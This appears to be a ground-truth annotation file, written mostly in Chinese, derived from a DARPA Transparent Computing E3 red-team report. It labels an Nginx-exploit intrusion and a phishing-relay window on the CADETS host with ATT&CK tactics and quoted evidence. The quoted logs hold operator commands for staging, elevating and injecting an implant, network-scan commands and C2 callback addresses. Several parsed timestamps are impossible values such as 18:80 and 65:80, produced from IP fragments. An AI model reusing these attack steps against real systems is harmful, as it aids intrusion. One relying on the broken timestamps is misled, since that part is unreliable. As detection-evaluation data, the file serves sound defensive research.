# E3 报告驱动的富证据 GT（2026-06-18）

## 生成说明

- 主事实来源：`D:\dataji\TC_Ground_Truth_Report_E3_Update_md\TC_Ground_Truth_Report_E3_Update.md`
- 旧 GT 只用于复用已有 `window_id` 命名：`D:\daima\APT-Fusionstep2b1\docs\darpa_attack_eval_ground_truth_2026-05-26.json`
- 覆盖 host：`TRACE`、`CADETS`、`THEIA`、`FIVEDIRECTIONS`
- 战术与 technique 都按报告原文保守判定；证据不足时保留为空，不做补全。
- `recommended_gt_time_offset_minutes_by_host` 在新 JSON 中故意留空，因为 E3 报告本身没有给出 host 级时间偏移建议。

## Host Summary

| Host | Window Count | Confirmed | Attempted Failed | Insufficient | Confirmed Tactics | Attempted Tactics |
| --- | ---: | ---: | ---: | ---: | --- | --- |
| CADETS | 5 | 4 | 0 | 1 | COMMAND_AND_CONTROL, DEFENSE_EVASION, DISCOVERY, EXECUTION, INITIAL_ACCESS, PRIVILEGE_ESCALATION | - |
| FIVEDIRECTIONS | 4 | 2 | 1 | 1 | COLLECTION, COMMAND_AND_CONTROL, DEFENSE_EVASION, DISCOVERY, EXECUTION, EXFILTRATION, INITIAL_ACCESS | EXECUTION, INITIAL_ACCESS |
| THEIA | 4 | 3 | 1 | 0 | COMMAND_AND_CONTROL, CREDENTIAL_ACCESS, DEFENSE_EVASION, DISCOVERY, EXECUTION, INITIAL_ACCESS, PRIVILEGE_ESCALATION | EXECUTION, INITIAL_ACCESS |
| TRACE | 5 | 4 | 1 | 0 | COMMAND_AND_CONTROL, CREDENTIAL_ACCESS, DEFENSE_EVASION, DISCOVERY, EXECUTION, INITIAL_ACCESS, PRIVILEGE_ESCALATION | EXECUTION, INITIAL_ACCESS |

## CADETS

### CADETS_20180406_1121_1208_01 / Section 3.1

- 标题：`20180406 1100 CADETS – Nginx Backdoor w/ Drakon In-Memory`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-06T11:21:00` -> `2018-04-06T12:08:00`
- Markdown 行号：`158-237`
- 报告页：`3, 4`
- 攻击概述：CADETS 上的 Nginx 被成功利用，drakon/operator console 回连建立，攻击者提权运行 netrecon 并尝试向 sshd 注入 libdrakon，最终 CADETS 崩溃。
- 备注：窗口只把成功攻击链记为 confirmed；失败的 sshd 注入单独保留在 behavior_chain 中，不上升为窗口级 attempted tactics。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | Nginx exploit 成功并进入目标主机，是窗口的进入起点。 | 3_1_e001, 3_1_e004, 3_1_e005 |
| EXECUTION | confirmed | 执行 | 攻击者把 drakon/netrecon 相关载荷落盘并提权运行。 | 3_1_e001, 3_1_e006, 3_1_e025, 3_1_e010, 3_1_e013, 3_1_e023, 3_1_e024 |
| PRIVILEGE_ESCALATION | confirmed | 提权 | 正文明确写到新进程以 root 权限运行。 | 3_1_e001, 3_1_e006, 3_1_e025 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | drakon/operator console 回连在多处证据中被直接描述。 | 3_1_e001, 3_1_e005, 3_1_e028, 3_1_e029 |
| DISCOVERY | confirmed | 侦察发现 | 攻击者执行 nrinfo/nrtcp 与 ps，对网络和进程做侦察。 | 3_1_e001, 3_1_e007, 3_1_e008, 3_1_e009, 3_1_e031, 3_1_e011 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1190 | confirmed | 报告明确写明利用 Nginx 公网服务发起 exploit。 | 3_1_e001, 3_1_e004, 3_1_e005 |
| T1071.001 | confirmed | drakon/operator console 使用 web/HTTP 风格回连进行控制。 | 3_1_e001, 3_1_e005, 3_1_e028, 3_1_e029 |
| T1105 | confirmed | 攻击者把 drakon/libdrakon/netrecon 等组件传入主机使用。 | 3_1_e001, 3_1_e010, 3_1_e013, 3_1_e023, 3_1_e024 |
| T1046 | confirmed | nrtcp/netrecon 明确对应网络服务侦察。 | 3_1_e001, 3_1_e007, 3_1_e008, 3_1_e009, 3_1_e031 |
| T1057 | confirmed | Event Log 中有直接的 ps 进程枚举。 | 3_1_e011 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| exploit_delivery | exploit_delivery | confirmed | 报告正文与 Event Log 都明确写到第二次 Nginx exploit 成功。 | 3_1_e001, 3_1_e004, 3_1_e005 |
| c2_callback | c2_callback | confirmed | loaderDrakon/operator console 回连在正文、Event Log 和连接交互中都有明确记录。 | 3_1_e001, 3_1_e005, 3_1_e028, 3_1_e029 |
| payload_elevate | payload_elevate | confirmed | 正文写明下载文件后被提升为 root 新进程，交互里也有 elevate。 | 3_1_e001, 3_1_e006, 3_1_e025 |
| network_scan | scan | confirmed | Event Log 里的 nrinfo/nrtcp 与正文里的 netrecon 共同支撑网络侦察行为。 | 3_1_e001, 3_1_e007, 3_1_e008, 3_1_e009, 3_1_e031 |
| module_transfer | payload_write | confirmed | Event Log 和文件交互均明确记录了 libdrakon 落盘到 /var/log/devc。 | 3_1_e001, 3_1_e010, 3_1_e013, 3_1_e023, 3_1_e024 |
| inject_attempt | inject_attempt | attempted | 报告明确记录了向 sshd 注入 libdrakon 的尝试，但失败并导致 CADETS 崩溃。 | 3_1_e001, 3_1_e003, 3_1_e012, 3_1_e013, 3_1_e014, 3_1_e024 |
| process_discovery | process_discovery | confirmed | Event Log 中有显式 ps。 | 3_1_e011 |

#### 显式观测

- `ip_port` / `154.145.113.18:80`  Evidence: `3_1_e001`  Raw: 154.145.113.18:80
- `ip_port` / `61.167.39.128:80`  Evidence: `3_1_e001, 3_1_e021`  Raw: 61.167.39.128:80
- `file_path` / `/var/log/devc.`  Evidence: `3_1_e001`  Raw: /var/log/devc.
- `pid` / `809`  Evidence: `3_1_e001`  Raw: 809
- `process_name` / `nginx`  Evidence: `3_1_e001, 3_1_e027, 3_1_e028`  Raw: nginx
- `process_name` / `sshd`  Evidence: `3_1_e001, 3_1_e002`  Raw: sshd
- `process_name` / `drakon`  Evidence: `3_1_e001, 3_1_e004, 3_1_e010, 3_1_e017, 3_1_e018, 3_1_e019, 3_1_e022, 3_1_e023`  Raw: drakon
- `process_name` / `loaderdrakon`  Evidence: `3_1_e001, 3_1_e017`  Raw: loaderdrakon
- `process_name` / `netrecon`  Evidence: `3_1_e001, 3_1_e020, 3_1_e021`  Raw: netrecon
- `command` / `Began attack with CADETS FreeBSD by exploiting Nginx. The first attempt to exploit Nginx failed. The second attempt succeeded and resulted in loaderDrakon connected to an operator console shell. The attacker downloaded a file to be elevated as a new process running as root. The elevated process downloaded and ran the netrecon module. The netrecon module failed to connect out to the first netcat address, 154.145.113.18:80. The second attempt worked with netcat address 61.167.39.128:80. The attacker downloaded the libdrakon module to be injected to location /var/log/devc. The attacker tried to inject into sshd PID 809 but the injection failed. The CADETS host locked up around this time and resulted in a kernel panic. This resulted in lost connection to loaderDrakon on the target. Do not know what caused the kernel panic but CADETS was going to investigate.`  Evidence: `3_1_e001`  Raw: elevate
- `host` / `CADETS`  Evidence: `3_1_e001, 3_1_e002, 3_1_e003, 3_1_e014`  Raw: CADETS
- `command` / `The first attack on the target network was the FreeBSD server. The plan was to gain access to CADETS, inject into a process like sshd, and sit there for a week while performing recon on the other networked hosts.`  Evidence: `3_1_e002`  Raw: inject
- `command` / `Unfortunately, we ran into too many problems preventing us from being able to do so. We discovered during the attack that our process injection was not working. Process injection requires our elevate driver, which must be built using the kernel headers on the target in order for it to work properly, but we had gotten the correct kernel headers from CADETS and tested previously during the setup week without issue. We do not know what changed or why it no longer worked. We did find a problem with our elevate driver not releasing a mutex in some cases. It's possible this condition was occurring on the CADETS host after benign activity had been running or while the TA1 technology is running. This lead us to the realization that testing on the target environment alone is not enough. We need to start testing on the target environment with the benign activity running and the TA1 technology recording and publishing for the next engagement. As a result of our failed process injection, CADETS itself had a kernel panic, and we lost access to the target. We would go on to retry process injection a few more times over the engagement period without success.`  Evidence: `3_1_e003`  Raw: elevate
- `command` / `11:33 elevate`  Evidence: `3_1_e006`  Raw: elevate
- `file_path` / `/deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139`  Evidence: `3_1_e010, 3_1_e023`  Raw: /deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139
- `file_path` / `/var/log/devc`  Evidence: `3_1_e010, 3_1_e013, 3_1_e023, 3_1_e024`  Raw: /var/log/devc
- `domain` / `libdrakon.freebsd`  Evidence: `3_1_e010, 3_1_e023`  Raw: libdrakon.freebsd
- `command` / `12:04 putfile ./deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139 /var/log/devc`  Evidence: `3_1_e010`  Raw: putfile
- `command` / `12:04 ps`  Evidence: `3_1_e011`  Raw: ps
- `command` / `12:08 inject foo 123`  Evidence: `3_1_e012`  Raw: inject
- `command` / `12:08 inject /var/log/devc xxx`  Evidence: `3_1_e013`  Raw: inject
- `command` / `CADETS crashed, lost shell, no injection`  Evidence: `3_1_e014`  Raw: inject
- `ip_port` / `81.49.200.166:80`  Evidence: `3_1_e015`  Raw: 81.49.200.166:80
- `ip_port` / `128.55.12.167:8000`  Evidence: `3_1_e015`  Raw: 128.55.12.167:8000
- `ip_port` / `78.205.235.65:80`  Evidence: `3_1_e016, 3_1_e027`  Raw: 78.205.235.65:80
- `ip_port` / `128.55.12.167:8001`  Evidence: `3_1_e016`  Raw: 128.55.12.167:8001
- `ip_port` / `200.36.109.214:80`  Evidence: `3_1_e017, 3_1_e028`  Raw: 200.36.109.214:80
- `ip_port` / `128.55.12.167:8002`  Evidence: `3_1_e017`  Raw: 128.55.12.167:8002
- `domain` / `loaderDrakon.freebsd`  Evidence: `3_1_e017`  Raw: loaderDrakon.freebsd
- `ip_port` / `139.123.0.113:80`  Evidence: `3_1_e018, 3_1_e029`  Raw: 139.123.0.113:80
- `ip_port` / `128.55.12.167:8003`  Evidence: `3_1_e018`  Raw: 128.55.12.167:8003
- `domain` / `drakon.freebsd`  Evidence: `3_1_e018, 3_1_e022`  Raw: drakon.freebsd
- `ip_port` / `152.111.159.139:80`  Evidence: `3_1_e019`  Raw: 152.111.159.139:80
- `ip_port` / `128.55.12.167:8004`  Evidence: `3_1_e019`  Raw: 128.55.12.167:8004
- `ip_port` / `154.143.113.18:80`  Evidence: `3_1_e020`  Raw: 154.143.113.18:80
- `ip_port` / `128.55.12.167:8005`  Evidence: `3_1_e020`  Raw: 128.55.12.167:8005
- `ip_port` / `128.55.12.167:8006`  Evidence: `3_1_e021`  Raw: 128.55.12.167:8006
- `file_path` / `/deploy/archive/drakon.freebsd.x64_139.123.0.113`  Evidence: `3_1_e022`  Raw: /deploy/archive/drakon.freebsd.x64_139.123.0.113
- `file_path` / `/tmp/vUgefal`  Evidence: `3_1_e022, 3_1_e025`  Raw: /tmp/vUgefal
- `command` / `F1>putfile ./deploy/archive/drakon.freebsd.x64_139.123.0.113 /tmp/vUgefal`  Evidence: `3_1_e022`  Raw: putfile
- `command` / `F2>putfile ./deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139 /var/log/devc`  Evidence: `3_1_e023`  Raw: putfile
- `command` / `F2>inject /var/log/devc 809`  Evidence: `3_1_e024`  Raw: inject
- `command` / `F1>elevate /tmp/vUgefal`  Evidence: `3_1_e025`  Raw: elevate

#### 原始子节摘录

- `3.1.lead` Section Lead (lines 160-168)

  > Began attack with CADETS FreeBSD by exploiting Nginx. The first attempt to exploit Nginx failed. The
  > second attempt succeeded and resulted in loaderDrakon connected to an operator console shell. The
  > attacker downloaded a file to be elevated as a new process running as root. The elevated process
  > downloaded and ran the netrecon module. The netrecon module failed to connect out to the first
  > netcat address, 154.145.113.18:80. The second attempt worked with netcat address 61.167.39.128:80.
  > The attacker downloaded the libdrakon module to be injected to location /var/log/devc. The attacker
  > tried to inject into sshd PID 809 but the injection failed. The CADETS host locked up around this time
  > and resulted in a kernel panic. This resulted in lost connection to loaderDrakon on the target. Do not
  > know what caused the kernel panic but CADETS was going to investigate.

- `3.1.1` Comments (lines 170-188)

  > The first attack on the target network was the FreeBSD server. The plan was to gain access to CADETS,
  > inject into a process like sshd, and sit there for a week while performing recon on the other networked
  > hosts.
  > Unfortunately, we ran into too many problems preventing us from being able to do so. We discovered
  > during the attack that our process injection was not working. Process injection requires our elevate
  > driver, which must be built using the kernel headers on the target in order for it to work properly, but
  > we had gotten the correct kernel headers from CADETS and tested previously during the setup week
  > without issue. We do not know what changed or why it no longer worked. We did find a problem with
  > our elevate driver not releasing a mutex in some cases. It's possible this condition was occurring on the
  > CADETS host after benign activity had been running or while the TA1 technology is running. This lead us
  > to the realization that testing on the target environment alone is not enough. We need to start testing
  > on the target environment with the benign activity running and the TA1 technology recording and
  > publishing for the next engagement. As a result of our failed process injection, CADETS itself had a
  > kernel panic, and we lost access to the target. We would go on to retry process injection a few more
  > times over the engagement period without success.

- `3.1.2` Event Log (lines 189-202)

  > - 11:21 HTTP post sent, exploit worked but no drakon connection to operator console
  > - 11.22 Successful, connect back
  > - 11:33 elevate
  > - 11:38 nrinfo
  > - 11:39 nrtcp 154.145.113.18 80
  > - 11:42 nrtcp 61.167.39.128 80
  > - 12:04 putfile ./deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139 /var/log/devc
  > - 12:04 ps
  > - 12:08 inject foo 123
  > - 12:08 inject /var/log/devc xxx
  > - CADETS crashed, lost shell, no injection

- `3.1.3` Addresses (lines 203-212)

  > - [eth0:800] 81.49.200.166:80 -> 128.55.12.167:8000  http_post
  > - [eth0:801] 78.205.235.65:80 -> 128.55.12.167:8001   shellcode_server
  > - [eth0:802] 200.36.109.214:80 -> 128.55.12.167:8002 loaderDrakon.freebsd.x64
  > - [eth0:803] 139.123.0.113:80 -> 128.55.12.167:8003  drakon.freebsd.x64
  > - [eth0:804] 152.111.159.139:80 -> 128.55.12.167:8004 libdrakon.freebsd.x64.so
  > - [eth0:805] 154.143.113.18:80 -> 128.55.12.167:8005 netrecon (nrtcp fail)
  > - [eth0:806] 61.167.39.128:80 -> 128.55.12.167:8006  netrecon (nrtcp success)

- `3.1.4` Interactions (lines 213-214)
- `3.1.4.1` Files (lines 215-220)

  > - F1>putfile ./deploy/archive/drakon.freebsd.x64_139.123.0.113 /tmp/vUgefal
  > - F2>putfile ./deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139 /var/log/devc
  > - F2>inject /var/log/devc 809

- `3.1.4.2` Processes (lines 221-224)

  > - F1>elevate /tmp/vUgefal

- `3.1.4.3` Connections (lines 225-233)

  > - exploit: connection on port 80 from 81.49.200.166
  > - nginx: connection to 78.205.235.65:80
  > - nginx: connection to 200.36.109.214:80
  > - vUgefal: connection to 139.123.0.113:80
  > - F2>nrtcp 154.145.113.18 80 (failed?)
  > - F2>nrtcp 61.167.39.128 80

- `3.1.5` Graph (lines 234-237)
#### 证据条目

1. `3_1_e001` | `narrative_comment` | `3.1.lead Section Lead` | lines `160-168`
   - Raw: Began attack with CADETS FreeBSD by exploiting Nginx. The first attempt to exploit Nginx failed. The second attempt succeeded and resulted in loaderDrakon connected to an operator console shell. The attacker downloaded a file to be elevated as a new process running as root. The elevated process downloaded and ran the netrecon module. The netrecon module failed to connect out to the first netcat address, 154.145.113.18:80. The second attempt worked with netcat address 61.167.39.128:80. The attacker downloaded the libdrakon module to be injected to location /var/log/devc. The attacker tried to inject into sshd PID 809 but the injection failed. The CADETS host locked up around this time and resulted in a kernel panic. This resulted in lost connection to loaderDrakon on the target. Do not know what caused the kernel panic but CADETS was going to investigate.
   - Time: `18:80` / `2018-04-06T18:80:00`
   - Observables: ip_port=154.145.113.18:80; ip_port=61.167.39.128:80; file_path=/var/log/devc.; pid=809; process_name=nginx; process_name=sshd; process_name=drakon; process_name=loaderdrakon; process_name=netrecon; command=Began attack with CADETS FreeBSD by exploiting Nginx. The first attempt to exploit Nginx failed. The second attempt succeeded and resulted in loaderDrakon connected to an operator console shell. The attacker downloaded a file to be elevated as a new process running as root. The elevated process downloaded and ran the netrecon module. The netrecon module failed to connect out to the first netcat address, 154.145.113.18:80. The second attempt worked with netcat address 61.167.39.128:80. The attacker downloaded the libdrakon module to be injected to location /var/log/devc. The attacker tried to inject into sshd PID 809 but the injection failed. The CADETS host locked up around this time and resulted in a kernel panic. This resulted in lost connection to loaderDrakon on the target. Do not know what caused the kernel panic but CADETS was going to investigate.; host=CADETS
1. `3_1_e002` | `narrative_comment` | `3.1.1 Comments` | lines `172-174`
   - Raw: The first attack on the target network was the FreeBSD server. The plan was to gain access to CADETS, inject into a process like sshd, and sit there for a week while performing recon on the other networked hosts.
   - Time: `-` / `-`
   - Observables: process_name=sshd; command=The first attack on the target network was the FreeBSD server. The plan was to gain access to CADETS, inject into a process like sshd, and sit there for a week while performing recon on the other networked hosts.; host=CADETS
1. `3_1_e003` | `narrative_comment` | `3.1.1 Comments` | lines `176-187`
   - Raw: Unfortunately, we ran into too many problems preventing us from being able to do so. We discovered during the attack that our process injection was not working. Process injection requires our elevate driver, which must be built using the kernel headers on the target in order for it to work properly, but we had gotten the correct kernel headers from CADETS and tested previously during the setup week without issue. We do not know what changed or why it no longer worked. We did find a problem with our elevate driver not releasing a mutex in some cases. It's possible this condition was occurring on the CADETS host after benign activity had been running or while the TA1 technology is running. This lead us to the realization that testing on the target environment alone is not enough. We need to start testing on the target environment with the benign activity running and the TA1 technology recording and publishing for the next engagement. As a result of our failed process injection, CADETS itself had a kernel panic, and we lost access to the target. We would go on to retry process injection a few more times over the engagement period without success.
   - Time: `-` / `-`
   - Observables: command=Unfortunately, we ran into too many problems preventing us from being able to do so. We discovered during the attack that our process injection was not working. Process injection requires our elevate driver, which must be built using the kernel headers on the target in order for it to work properly, but we had gotten the correct kernel headers from CADETS and tested previously during the setup week without issue. We do not know what changed or why it no longer worked. We did find a problem with our elevate driver not releasing a mutex in some cases. It's possible this condition was occurring on the CADETS host after benign activity had been running or while the TA1 technology is running. This lead us to the realization that testing on the target environment alone is not enough. We need to start testing on the target environment with the benign activity running and the TA1 technology recording and publishing for the next engagement. As a result of our failed process injection, CADETS itself had a kernel panic, and we lost access to the target. We would go on to retry process injection a few more times over the engagement period without success.; host=CADETS
1. `3_1_e004` | `event_log` | `3.1.2 Event Log` | lines `191-191`
   - Raw: 11:21 HTTP post sent, exploit worked but no drakon connection to operator console
   - Time: `11:21` / `2018-04-06T11:21:00`
   - Observables: process_name=drakon
1. `3_1_e005` | `event_log` | `3.1.2 Event Log` | lines `192-192`
   - Raw: 11.22 Successful, connect back
   - Time: `11.22` / `2018-04-06T11:22:00`
   - Observables: -
1. `3_1_e006` | `event_log` | `3.1.2 Event Log` | lines `193-193`
   - Raw: 11:33 elevate
   - Time: `11:33` / `2018-04-06T11:33:00`
   - Observables: command=11:33 elevate
1. `3_1_e007` | `event_log` | `3.1.2 Event Log` | lines `194-194`
   - Raw: 11:38 nrinfo
   - Time: `11:38` / `2018-04-06T11:38:00`
   - Observables: -
1. `3_1_e008` | `event_log` | `3.1.2 Event Log` | lines `195-195`
   - Raw: 11:39 nrtcp 154.145.113.18 80
   - Time: `11:39` / `2018-04-06T11:39:00`
   - Observables: -
1. `3_1_e009` | `event_log` | `3.1.2 Event Log` | lines `196-196`
   - Raw: 11:42 nrtcp 61.167.39.128 80
   - Time: `11:42` / `2018-04-06T11:42:00`
   - Observables: -
1. `3_1_e010` | `event_log` | `3.1.2 Event Log` | lines `197-197`
   - Raw: 12:04 putfile ./deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139 /var/log/devc
   - Time: `12:04` / `2018-04-06T12:04:00`
   - Observables: file_path=/deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139; file_path=/var/log/devc; domain=libdrakon.freebsd; process_name=drakon; command=12:04 putfile ./deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139 /var/log/devc
1. `3_1_e011` | `event_log` | `3.1.2 Event Log` | lines `198-198`
   - Raw: 12:04 ps
   - Time: `12:04` / `2018-04-06T12:04:00`
   - Observables: command=12:04 ps
1. `3_1_e012` | `event_log` | `3.1.2 Event Log` | lines `199-199`
   - Raw: 12:08 inject foo 123
   - Time: `12:08` / `2018-04-06T12:08:00`
   - Observables: command=12:08 inject foo 123
1. `3_1_e013` | `event_log` | `3.1.2 Event Log` | lines `200-200`
   - Raw: 12:08 inject /var/log/devc xxx
   - Time: `12:08` / `2018-04-06T12:08:00`
   - Observables: file_path=/var/log/devc; command=12:08 inject /var/log/devc xxx
1. `3_1_e014` | `event_log` | `3.1.2 Event Log` | lines `201-201`
   - Raw: CADETS crashed, lost shell, no injection
   - Time: `-` / `-`
   - Observables: command=CADETS crashed, lost shell, no injection; host=CADETS
1. `3_1_e015` | `address` | `3.1.3 Addresses` | lines `205-205`
   - Raw: [eth0:800] 81.49.200.166:80 -> 128.55.12.167:8000  http_post
   - Time: `81.49` / `2018-04-06T81:49:00`
   - Observables: ip_port=81.49.200.166:80; ip_port=128.55.12.167:8000
1. `3_1_e016` | `address` | `3.1.3 Addresses` | lines `206-206`
   - Raw: [eth0:801] 78.205.235.65:80 -> 128.55.12.167:8001   shellcode_server
   - Time: `65:80` / `2018-04-06T65:80:00`
   - Observables: ip_port=78.205.235.65:80; ip_port=128.55.12.167:8001
1. `3_1_e017` | `address` | `3.1.3 Addresses` | lines `207-207`
   - Raw: [eth0:802] 200.36.109.214:80 -> 128.55.12.167:8002 loaderDrakon.freebsd.x64
   - Time: `55.12` / `2018-04-06T55:12:00`
   - Observables: ip_port=200.36.109.214:80; ip_port=128.55.12.167:8002; domain=loaderDrakon.freebsd; process_name=drakon; process_name=loaderdrakon
1. `3_1_e018` | `address` | `3.1.3 Addresses` | lines `208-208`
   - Raw: [eth0:803] 139.123.0.113:80 -> 128.55.12.167:8003  drakon.freebsd.x64
   - Time: `55.12` / `2018-04-06T55:12:00`
   - Observables: ip_port=139.123.0.113:80; ip_port=128.55.12.167:8003; domain=drakon.freebsd; process_name=drakon
1. `3_1_e019` | `address` | `3.1.3 Addresses` | lines `209-209`
   - Raw: [eth0:804] 152.111.159.139:80 -> 128.55.12.167:8004 libdrakon.freebsd.x64.so
   - Time: `55.12` / `2018-04-06T55:12:00`
   - Observables: ip_port=152.111.159.139:80; ip_port=128.55.12.167:8004; process_name=drakon
1. `3_1_e020` | `address` | `3.1.3 Addresses` | lines `210-210`
   - Raw: [eth0:805] 154.143.113.18:80 -> 128.55.12.167:8005 netrecon (nrtcp fail)
   - Time: `18:80` / `2018-04-06T18:80:00`
   - Observables: ip_port=154.143.113.18:80; ip_port=128.55.12.167:8005; process_name=netrecon
1. `3_1_e021` | `address` | `3.1.3 Addresses` | lines `211-211`
   - Raw: [eth0:806] 61.167.39.128:80 -> 128.55.12.167:8006  netrecon (nrtcp success)
   - Time: `55.12` / `2018-04-06T55:12:00`
   - Observables: ip_port=61.167.39.128:80; ip_port=128.55.12.167:8006; process_name=netrecon
1. `3_1_e022` | `interaction_file` | `3.1.4.1 Files` | lines `217-217`
   - Raw: F1>putfile ./deploy/archive/drakon.freebsd.x64_139.123.0.113 /tmp/vUgefal
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/drakon.freebsd.x64_139.123.0.113; file_path=/tmp/vUgefal; domain=drakon.freebsd; process_name=drakon; command=F1>putfile ./deploy/archive/drakon.freebsd.x64_139.123.0.113 /tmp/vUgefal
1. `3_1_e023` | `interaction_file` | `3.1.4.1 Files` | lines `218-218`
   - Raw: F2>putfile ./deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139 /var/log/devc
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139; file_path=/var/log/devc; domain=libdrakon.freebsd; process_name=drakon; command=F2>putfile ./deploy/archive/libdrakon.freebsd.x64.so_152.111.159.139 /var/log/devc
1. `3_1_e024` | `interaction_file` | `3.1.4.1 Files` | lines `219-219`
   - Raw: F2>inject /var/log/devc 809
   - Time: `-` / `-`
   - Observables: file_path=/var/log/devc; command=F2>inject /var/log/devc 809
1. `3_1_e025` | `interaction_process` | `3.1.4.2 Processes` | lines `223-223`
   - Raw: F1>elevate /tmp/vUgefal
   - Time: `-` / `-`
   - Observables: file_path=/tmp/vUgefal; command=F1>elevate /tmp/vUgefal
1. `3_1_e026` | `interaction_connection` | `3.1.4.3 Connections` | lines `227-227`
   - Raw: exploit: connection on port 80 from 81.49.200.166
   - Time: `81.49` / `2018-04-06T81:49:00`
   - Observables: -
1. `3_1_e027` | `interaction_connection` | `3.1.4.3 Connections` | lines `228-228`
   - Raw: nginx: connection to 78.205.235.65:80
   - Time: `65:80` / `2018-04-06T65:80:00`
   - Observables: ip_port=78.205.235.65:80; process_name=nginx
1. `3_1_e028` | `interaction_connection` | `3.1.4.3 Connections` | lines `229-229`
   - Raw: nginx: connection to 200.36.109.214:80
   - Time: `-` / `-`
   - Observables: ip_port=200.36.109.214:80; process_name=nginx
1. `3_1_e029` | `interaction_connection` | `3.1.4.3 Connections` | lines `230-230`
   - Raw: vUgefal: connection to 139.123.0.113:80
   - Time: `-` / `-`
   - Observables: ip_port=139.123.0.113:80
1. `3_1_e030` | `interaction_connection` | `3.1.4.3 Connections` | lines `231-231`
   - Raw: F2>nrtcp 154.145.113.18 80 (failed?)
   - Time: `-` / `-`
   - Observables: -
1. `3_1_e031` | `interaction_connection` | `3.1.4.3 Connections` | lines `232-232`
   - Raw: F2>nrtcp 61.167.39.128 80
   - Time: `-` / `-`
   - Observables: -

### CADETS_20180406_1500_1500_05 / Section 4.1

- 标题：`20180406 1500 CADETS – E-mail Server`
- 状态：`insufficient`
- 时间精度：`coarse_summary`
- 时间窗：`2018-04-06T15:00:00` -> `2018-04-06T15:00:00`
- Markdown 行号：`1258-1303`
- 报告页：`30, 31`
- 攻击概述：该节描述的是攻击者借助 CADETS 上的 postfix 邮件服务器发送多批 phishing 邮件；报告明确说明这不是对 CADETS 的直接攻陷，而是 CADETS 作为邮件基础设施被间接使用。
- 备注：保留该窗口是为了后续把邮件投递行为与其他 host 的 phishing 行为对齐，但不把它当成 CADETS 成功被攻陷的攻击窗口。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| - | - | - | 该节不输出战术结论。 | - |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| - | - | 该节不输出 technique 结论。 | - |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| mail_delivery | service_connection | confirmed | Event Log 和 Connections 都明确写到从外部 IP 连接 CADETS 的 25 端口发送钓鱼邮件。 | 4_1_e001, 4_1_e003, 4_1_e005, 4_1_e007 |

#### 显式观测

- `process_name` / `postfix`  Evidence: `4_1_e001, 4_1_e002`  Raw: postfix
- `host` / `CADETS`  Evidence: `4_1_e001, 4_1_e002`  Raw: CADETS
- `user` / `bob@bovia`  Evidence: `4_1_e003`  Raw: bob@bovia
- `host` / `FIVEDIRECTIONS`  Evidence: `4_1_e004`  Raw: FiveDirections
- `user` / `everyone@bovia.com`  Evidence: `4_1_e005`  Raw: everyone@bovia.com
- `domain` / `bovia.com`  Evidence: `4_1_e005`  Raw: bovia.com
- `host` / `TRACE`  Evidence: `4_1_e005`  Raw: TRACE
- `host` / `THEIA`  Evidence: `4_1_e005`  Raw: THEIA
- `ip_port` / `62.83.155.175:80`  Evidence: `4_1_e006`  Raw: 62.83.155.175:80
- `ip_port` / `128.55.12.167:8007`  Evidence: `4_1_e006`  Raw: 128.55.12.167:8007

#### 原始子节摘录

- `4.1.lead` Section Lead (lines 1260-1260)

  > The attacker sent multiple phishing e-mails by connecting to the postfix server hosted on CADETS.

- `4.1.1` Comments (lines 1262-1272)

  > While we did not attack CADETS directly as the common threat attacker, CADETS was indirectly involved
  > in all of the phishing e-mail attacks as CADETS hosted the postfix e-mail server used by the Bovia hosts.
  > We sent the phishing e-mails to the various target users by connecting to the CADETS e-mail server on
  > port 25. Unlike the e-mails sent internally, our e-mails impersonated Bovia and Bovia users while using
  > external IP addresses. If these attacks were detected on CADETS, they could have possibly prevented
  > the phishing e-mails from being delivered to the targeted users. We weren't expecting CADETS to
  > monitor and validate e-mails but were curious if the unexpected connections would be detected
  > amongst all of the spam we sent to the performers.

- `4.1.2` Event Log (lines 1273-1274)
- `4.1.2.1` ClearScope 20180406 (lines 1275-1279)

  > - 14:40 Sent e-mail to bob@bovia without link from 62.83.155.175 (ClearScope)
  > - 15:02 Sent e-mail to bob@bovia with link from 62.83.155.175 (ClearScope)

- `4.1.2.2` Windows 20180409 (lines 1280-1284)

  > - 13:19 Send e-mail from Bob to Charles from 62.83.155.175 (FiveDirections)
  > - 14:19 Send e-mail from Bob to Henry from 62.83.155.175 (TA5.2 Windows)

- `4.1.2.3` Linux 20180410 (lines 1285-1289)

  > - 12:28 Phishing email to everyone@bovia.com from Bob from 62.83.155.175
  > (THEIA/TRACE)

- `4.1.3` Addresses (lines 1290-1293)

  > - [eth0:807] 62.83.155.175:80 -> 128.55.12.167:8007 phishing attack

- `4.1.4` Interactions (lines 1294-1295)
- `4.1.4.1` Connections (lines 1296-1299)

  > - Connection from 62.83.155.175 on port 25.

- `4.1.5` Graph (lines 1300-1303)
#### 证据条目

1. `4_1_e001` | `narrative_comment` | `4.1.lead Section Lead` | lines `1260-1260`
   - Raw: The attacker sent multiple phishing e-mails by connecting to the postfix server hosted on CADETS.
   - Time: `-` / `-`
   - Observables: process_name=postfix; host=CADETS
1. `4_1_e002` | `narrative_comment` | `4.1.1 Comments` | lines `1264-1271`
